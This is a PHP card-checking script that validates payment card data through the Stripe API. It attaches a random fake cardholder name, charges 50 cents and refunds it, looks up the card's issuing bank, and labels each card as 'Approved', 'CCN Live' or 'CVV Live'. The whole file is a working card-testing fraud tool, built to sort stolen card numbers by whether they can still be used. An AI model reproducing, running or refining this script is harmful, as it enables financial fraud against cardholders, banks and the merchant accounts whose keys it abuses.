<?php

// --- FULL DEBUG MODE ---
error_reporting(E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);

// --- SET DEFAULT TIMEZONE ---
date_default_timezone_set('UTC');



// --- RECEIVE DATA FROM CLI OR GET ---
$sk = $argv[1] ?? ($_GET['sk_key'] ?? null);
$lista = $argv[2] ?? ($_GET['cc'] ?? null);

if (!$sk || !$lista) {
    die("Error: Missing Stripe key or CC list arguments.\n");
}

// --- HELPER FUNCTIONS ---
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}

// --- PARSE CC DATA ---
$cc_parts = multiexplode(array(":", "|", " "), $lista);
$cc = $cc_parts[0] ?? '';
$mes = $cc_parts[1] ?? '';
$ano = $cc_parts[2] ?? '';
$cvv = $cc_parts[3] ?? '';

if (!$cc || !$mes || !$ano || !$cvv) {
    die("Error: Invalid CC format.\n");
}

// --- RANDOM USER DATA ---
$ch_user = curl_init();
curl_setopt($ch_user, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch_user, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch_user, CURLOPT_USERAGENT, 'Mozilla/5.0');
$get = curl_exec($ch_user);
curl_close($ch_user);

$name = 'John';
$last = 'Doe';
if ($get) {
    preg_match_all('/"first":"(.*?)"/i', $get, $matches1);
    preg_match_all('/"last":"(.*?)"/i', $get, $matches2);
    $name = $matches1[1][0] ?? 'John';
    $last = $matches2[1][0] ?? 'Doe';
}

// --- STRIPE SETUP ---
\Stripe\Stripe::setApiKey($sk);

$result1 = $result2 = $result3 = $result4 = "{}";
$token = null;
$customer = null;
$charge_id = null;

try {
    // --- CREATE TOKEN ---
    $tokenObj = \Stripe\Token::create([
        'card' => [
            'number' => $cc,
            'exp_month' => $mes,
            'exp_year' => $ano,
            'cvc' => $cvv,
            'name' => "$name $last"
        ]
    ]);
    $token = $tokenObj->id;
    $result1 = json_encode($tokenObj, JSON_PRETTY_PRINT);

    // --- CREATE CUSTOMER ---
    if ($token) {
        $customerObj = \Stripe\Customer::create([
            'description' => "$name $last",
            'source' => $token
        ]);
        $customer = $customerObj->id;
        $result2 = json_encode($customerObj, JSON_PRETTY_PRINT);
    }

    // --- CREATE CHARGE ---
    if ($customer) {
        $chargeObj = \Stripe\Charge::create([
            'amount' => 50, // in cents
            'currency' => 'usd',
            'customer' => $customer
        ]);
        $charge_id = $chargeObj->id ?? null;
        $result3 = json_encode($chargeObj, JSON_PRETTY_PRINT);
    }

    // --- CREATE REFUND ---
    if ($charge_id) {
        $refundObj = \Stripe\Refund::create([
            'charge' => $charge_id,
            'amount' => 50,
            'reason' => 'requested_by_customer'
        ]);
        $result4 = json_encode($refundObj, JSON_PRETTY_PRINT);
    }

} catch (\Stripe\Exception\ApiErrorException $e) {
    $error = $e->getJsonBody();
    $result1 = json_encode($error, JSON_PRETTY_PRINT);
}

// --- BIN LOOKUP ---
$cctwo = substr($cc, 0, 6);
$ch_bin = curl_init();
curl_setopt($ch_bin, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo);
curl_setopt($ch_bin, CURLOPT_USERAGENT, 'Mozilla/5.0');
curl_setopt($ch_bin, CURLOPT_RETURNTRANSFER, 1);
$fim = curl_exec($ch_bin);
curl_close($ch_bin);

$fim = json_decode($fim, true);
$bank = $fim['bank']['name'] ?? 'N/A';
$country = $fim['country']['alpha2'] ?? 'N/A';
$type = $fim['type'] ?? 'N/A';

// --- FULL DEBUG OUTPUT ---
echo "<pre>";
echo "=== DEBUG OUTPUT ===\n";
echo "Card: $lista\n";
echo "Stripe Token (Result1): $result1\n";
echo "Stripe Customer (Result2): $result2\n";
echo "Stripe Charge (Result3): $result3\n";
echo "Stripe Refund (Result4): $result4\n";
echo "Bank: $bank | Country: $country | Type: $type\n";
echo "==================\n";
echo "</pre>";

// --- RESPONSE LOGIC ---
if (strpos($result3, '"status": "succeeded"') !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-success'>$lista</span> ◈ <span class='badge badge-info'> 「Approved (Charge & Refund) ✅」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} elseif (strpos($result2, '"cvc_check": "pass"') !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-success'>$lista</span> ◈ <span class='badge badge-info'> 「Approved (CVV Pass) ✔️」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} elseif (strpos($result2, '"code": "incorrect_cvc"') !== false || strpos($result1, '"code": "invalid_cvc"') !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-danger'>$lista</span> ◈ <span class='badge badge-warning'> 「CCN Live (Incorrect CVV) 🟡」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} elseif (strpos($result3, "insufficient_funds") !== false) {
    echo "<span class='badge badge-success'>#Approved</span> ◈ <span class='badge badge-success'>$lista</span> ◈ <span class='badge badge-warning'> 「CVV Live (Insufficient Funds) 💰」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
} else {
    echo "<span class='badge badge-danger'>#Declined</span> ◈ <span class='badge badge-danger'>$lista</span> ◈ <span class='badge badge-warning'> 「An Unknown Error Occurred ❓」</span> ◈<span class='badge badge-info'> 「 $bank ($country) - $type 」 </span>";
}
?>
